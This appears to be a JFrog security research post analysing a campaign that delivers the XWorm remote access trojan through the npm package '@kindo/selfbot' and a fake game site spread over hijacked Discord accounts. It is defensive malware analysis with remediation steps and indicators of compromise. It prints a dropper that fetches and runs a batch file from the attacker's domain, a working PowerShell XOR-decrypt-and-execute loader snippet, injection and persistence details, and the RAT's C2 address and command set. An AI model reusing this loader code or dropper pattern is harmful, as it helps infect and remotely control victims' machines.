---
excerpt: JFrog Security researchers have discovered a multi-vector malware campaign distributing the XWorm RAT through both npm packages and a fake game website, targeting Discord users with social engineering tactics.
title: "Astral Injection: From Fake VideoGame to XWorm RAT via npm and Discord"
date: "April 15, 2026"
description: "Meitar Palas and Shavit Satou, JFrog Security Researchers"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/astral_injection/thumbnail.png
type: realTimePost
minutes: '6'
---

The JFrog Security research team have uncovered a malware campaign that spreads the XWorm remote access trojan through multiple channels: a malicious npm package named `@kindo/selfbot` and a fake game website promoted through hijacked Discord accounts. The attackers use social engineering to trick victims into downloading malware disguised as a legitimate indie game called "Astral Warfare."

## **The Social Engineering Play**

The campaign operates through compromised Discord accounts. Attackers hijack legitimate user accounts, then message the victim's friends with a seemingly innocent request: "Would you test my new game?" They provide a link to a professional-looking website at `astralwarfare[.]fr` along with the password needed to unpack the downloaded file.
![](/img/RealTimePostImage/post/astral_injection/astral_website_hero.png)

The website is convincingly designed, featuring game trailers, a fictional storyline about a guardian named "Ekis," and multiple download buttons. However, the downloaded `Astral_Warfare.rar` file contains nothing but malware.  
The "Ekis" game is entirely fabricated, the website's gameplay screenshots are stolen from a legitimate game  called “Elsie” developed by “Knight Shift Games”.  

![](/img/RealTimePostImage/post/astral_injection/astral_website_lore.png)

![](/img/RealTimePostImage/post/astral_injection/discord_screen.png)
 
## **The npm Vector**

In parallel to the Discord campaign, the attackers also published a malicious npm package:

- **Package:** `@kindo/selfbot`  
- **Versions:** 1.0.0 through 1.0.4  
- **Claimed purpose:** "Just a selfbot"  
- **Actual purpose:** Malware dropper

The package takes advantage of npm's `preinstall` hook to execute malicious code immediately upon installation. Simply running `npm install` is enough to trigger the payload.

### Dual Execution Path

The package has two triggers:

1. **Install-time:** The `preinstall` script in `package.json` runs `scripts/selfbot.js`  
2. **Import-time:** `index.js` exports the selfbot module, which runs its main function immediately when required

Either action \- installing or importing \- is enough to trigger the payload.

### Suspicious Self-Dependency

The package declares a dependency on itself (`"@kindo/selfbot": "^1.0.0"`). That is not normal \- either someone republished sloppily.

## **Technical Analysis: The Multi-Stage Dropper**

Both the npm package and the fake game executable follow similar staging patterns to deploy the XWorm RAT.

### Stage 0: JavaScript Dropper (npm)

The `scripts/selfbot.js` file is obfuscated but deobfuscates to a simple downloader:

```javascript
const url = "https://astralwarfare.fr/script.bat";
const out = join(process.cwd(), "script.bat");

async function download() {
  // Downloads script.bat from the attacker's server
}

async function run() {
  // Executes the batch file via cmd
}
```

The script downloads `https://astralwarfare[.]fr/script.bat` and executes it.

### Stage 0: Go Dropper (Game Executable)

The `Astral_Warfare.exe` binary is a 64-bit Go application that:

1. Concatenates 5,260 embedded string fragments into a large obfuscated Base64 blob  
2. Removes Greek-letter noise using regex `[αβγδεζηθικλμνξοπ]+`  
3. Base64-decodes the cleaned blob into a batch script  
4. Writes the batch to `%TEMP%\<random>.bat`  
5. Executes it via `ShellExecuteW` or `cmd.exe /C`

Both droppers lead to the same Stage 1 batch payload.

### Stage 1: Obfuscated Batch Script

The batch file (`252,438` bytes, `3,557` lines) is heavily obfuscated with:

- Hundreds of junk labels  
- Thousands of junk variable assignments  
- Fragmented commands assembled from environment variables  
- Embedded payloads hidden in `::` comment lines and `@`  prefixed lines

![](/img/RealTimePostImage/post/astral_injection/first_bat_file.png)

Key behaviors:

**Anti-Analysis Checks:**

- Exits if username is `Admin` or `admin` and `%TEMP%\VBE` or `%TEMP%\mapping.csv` exists  
- Exits if RAM is below 3 GB  
- Exits if system or BIOS manufacturer indicates VMware

**Staging:**

- Creates `C:\ProgramData\IntelDrIver` directory  
- Copies itself to `C:\ProgramData\IntelDrIver\rEgX.cmd`  
- Recursively marks files as hidden/system

**Disguised PowerShell:**

- Copies legitimate `powershell.exe` to `%USERPROFILE%\Downloads\CPU.exe`  
- Hides the renamed binary to reduce obvious PowerShell command lines

**Payload Extraction:**

- Extracts all `::` lines into `C:\ProgramData\IntelDriver\icon.png`  
- Extracts all `@`  lines into `C:\ProgramData\IntelDriver\logo.jpg`  
- These are not real images \- they contain encrypted payloads

**Decryption and Execution:**

```
$k = 'd6'  # XOR key
$d = [Convert]::FromBase64String((Get-Content 'logo.jpg' -Raw))
$s = ''
$idx = 0
foreach ($b in $d) {
  $s += [char]($b -bxor [byte][char]$k[$idx])
  $idx++
  if ($idx -ge $k.Length) { $idx = 0 }
}
IEX $s  # Execute decrypted PowerShell
```

### Stage 2: PowerShell Loader

The decrypted PowerShell loader (`17,415` bytes) uses multiple layers of obfuscation:

- Base64 \+ XOR decoding  
- Greek-letter junk insertion  
- ROT13-like alphabet shifts for embedded strings

**String Decoder Function:** `Mp4Vg7VapA`

Important decoded strings include:

- `New-Item`, `-Force | Out-Null`  
- `C:\ProgramData\IntelDriver`, `windows.ps1`  
- Process names: `explorer`, `SecurityHealthSystray`, `OneDrive`, `sihost`, `taskhostw`, `RuntimeBroker`

**Core Functions:**

- `si2ah5OX1r`: Reads file, strips noise, Base64-decodes  
- `qhx0GpqU7P`: Decodes file with XOR  
- `lh9NCC9Ejj`: Scans process memory for marker bytes `DE AD BE CA FE BA EF`  
- `Cchbid97qT`: Performs remote-thread injection

**Persistence:** If the primary payload path fails, the loader creates a scheduled task:

- Task name: `applicationbackup_`  
- XML path: `%APPDATA%\applicationbackup_.xml`  
- VBS path: `%LOCALAPPDATA%\applicationbackup_.vbs`  
- Description: `IntelDriver System Service`  
- Trigger: User logon  
- Action: `wscript.exe` launching the VBS, which runs `C:\ProgramData\IntelDriver\rEgX.cmd`

**Process Injection:**

- Primary target: `explorer`  
- Secondary targets (after 10 iterations): `SecurityHealthSystray`, `OneDrive`, `sihost`, `taskhostw`, `RuntimeBroker`  
- Injects Stage 4 shellcode using `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`  
- Injects up to 20 times with sleeps between attempts

### Stage 3: Decoded Payload

The loader attempts to decode `icon.png` into `windows.ps1`:

1. Strip `X/Ab` noise fragments  
2. Strip non-Base64 characters  
3. Base64 decode  
4. XOR with key `d6`

The output did not cleanly resolve to plaintext PowerShell in our static analysis, suggesting either an additional nested transform or embedded PE data.

### Stage 4: Injected Shellcode

The shellcode (`50,369` bytes) is position-independent x64 code with:

- Manual PEB-based module resolution  
- Anti-AMS/ETW targeting (`amsi`, `wldp`, `ntdll`, `EtwEventWrite`)  
- Custom ARX/XOR stream decryptor  
- XPRESS-family decompression

After decryption, it loads a compressed .NET module.

### Stage 5: XWormClient RAT

The final payload is `XWormClient.exe`, a .NET RAT with the following configuration:

| Config Item | Value |
| :---- | :---- |
| C2 Host | `185.94.29.43` |
| C2 Port | `7004` |
| Protocol Separator | `<Xwormmm>` |
| Group | `XWorm V7.4` |
| Mutex | `ksUtjUa9iXc5wwbk` |
| USB Name | `USB.exe` |
| Sleep Interval | `1` second |

**Command Matrix:**

| Command | Behavior |
| :---- | :---- |
| `pong` | Keepalive response |
| `rec` | Restart application |
| `CLOSE` | Shutdown connection |
| `uninstall` | Self-delete via BAT flow |
| `update` | Replace executable with new payload |
| `DW` | Download and execute from disk |
| `FM` | Reflective load .NET payload in memory |
| `LN` | Download URL to temp and execute |
| `Urlopen` | Open URL in browser |
| `Urlhide` | Hidden HTTP GET |
| `PCShutdown/PCRestart/PCLogoff` | System control |
| `RunShell` | Execute arbitrary command |
| `StartDDos/StopDDos` | HTTP flood attack |
| `StartReport/StopReport` | Window title monitoring |
| `$Cap` | Screenshot capture and exfiltration |
| `plugin/savePlugin/RemovePlugins` | Plugin management via registry |

**Plugin System:**

- Registry cache: `HKCU\Software\<ID>`  
- ID derived from MD5 of hardware info (20-char uppercase)  
- Plugins stored compressed with gzip  
- Methods: `Run`, `RunRecovery`, `RunOptions`, `injRun`, `UACFunc`, `ENC`/`DEC`

**C2 Protocol:**

- Framing: `ASCII(len(ciphertext)) || 0x00 || ciphertext`  
- Encryption: AES-ECB with key `MD5(Settings.KEY)`  
- Beacons detailed host profile: username, OS, arch, group, webcam, CPU/GPU/RAM, AV products

## **Cross-Vector Analysis**

Both the npm package and the game executable converge on the same infrastructure:

| Vector | Initial Dropper | Stage 1 | Stage 2 | Stage 3 | Final Payload |
| :---- | :---- | :---- | :---- | :---- | :---- |
| npm | JavaScript downloader (`selfbot.js`) | `script.bat` from URL | PowerShell loader | (Encrypted) | XWorm RAT |
| Game | Go binary (`Astral_Warfare.exe`) | Embedded batch | PowerShell loader | Shellcode | XWorm RAT |

The shared infrastructure (`astralwarfare[.]fr`), consistent staging patterns, and identical final payloads indicate a single threat actor operating multiple distribution channels.

## **Remediation** 

If you installed `@kindo/selfbot` or downloaded "Astral Warfare," assume your system is compromised.

### Step 1: Containment and Credential Rotation

The malware has full remote access capabilities. Rotate all secrets accessible on the machine:

- Discord tokens  
- npm tokens  
- SSH keys  
- Database credentials  
- Cloud provider keys

Check Discord for unauthorized messages sent from your account.

### Step 2: Kill Persistence

**Windows:**

Delete the scheduled task and persistence files:

```
schtasks /delete /tn "applicationbackup_" /f
Remove-Item "$env:APPDATA\applicationbackup_*.xml" -Force
Remove-Item "$env:LOCALAPPDATA\applicationbackup_*.vbs" -Force
```

### Step 3: Cleanup

Remove malicious artifacts:

```
Remove-Item "C:\ProgramData\IntelDrIver" -Recurse -Force
Remove-Item "C:\ProgramData\IntelDriver" -Recurse -Force
Remove-Item "$env:USERPROFILE\Downloads\CPU.exe" -Force
Remove-Item "$env:TEMP\script.bat" -Force
Remove-Item "$env:TEMP\VBE" -Force
Remove-Item "$env:TEMP\mapping.csv" -Force
```

### Step 4: Package Removal

If you installed the npm package:

```shell
rm -rf node_modules
npm cache clean --force
```

Check your `package.json` for any reference to `@kindo/selfbot` and remove it.

### Step 5: Long-Term Prevention

- Run `npm config set ignore-scripts true` to prevent automatic execution of install hooks  
- Use [**JFrog Curation**](https://jfrog.com/curation/) to implement automated dependency scanning and approval workflows

## **Conclusions**

This campaign shows threat actors are willing to put in real effort \- building a fake game website, coding a Go dropper, and maintaining an npm package \- just to get their malware onto developer machines. The multi-stage payload deploys XWorm RAT through multiple obfuscation layers, with anti-analysis checks and process injection to stay hidden.

If you installed `@kindo/selfbot` or downloaded "Astral Warfare," treat the machine as compromised. Rotate credentials, kill the persistence, and remove the package. JFrog Xray and JFrog Curation detect this malware.

##   **Indicators of Compromise (IoCs):**  Known Malicious Packages and Files:

| Package Name | Malicious Versions | Xray ID |
| :---- | :---- | :---- |
| `@kindo/selfbot` | 1.0.0, 1.0.1, 1.0.2, 1.0.3, 1.0.4 | XRAY-964727 |

## File Hashes:

| File | SHA256 |
| :---- | :---- |
| `Astral_Warfare.exe` | `219bd4b681b05addd5364bc9c741065bcdc698560b45c5cbf537561583b66702` |
| Stage 1 BAT | `0b2ce48e4be6a6be85565ce309d2f10cc1b3179a03d25a61f66c6b50fe37b010` |
| Stage 3 PowerShell | `7a8cef4bfa1ca9c24be4886136c30402d4433310283aee22e2da67cbb938b3a9` |
| Stage 4 Shellcode | `1255d41081452cd8fa2358860449bbf3b3494b80282e2bb4ba6b6980ceaf9be1` |
| Stage 5 XWormClient | `c26f8d09e0486aacba414f04c310c6532541d2cdf3f40d95e3fe224d9b77e0a6` |

### Network Indicators

- `https://astralwarfare[.]fr/script.bat`  
- `https://astralwarfare[.]fr/Astral_Warfare.rar`  
- C2: `185.94.29.43:7004`

### File Paths

- `C:\ProgramData\IntelDrIver\rEgX.cmd`  
- `C:\ProgramData\IntelDriver\icon.png`  
- `C:\ProgramData\IntelDriver\windows.ps1`  
- `%USERPROFILE%\Downloads\CPU.exe`  
- `%APPDATA%\applicationbackup_*.xml`  
- `%LOCALAPPDATA%\applicationbackup_*.vbs`
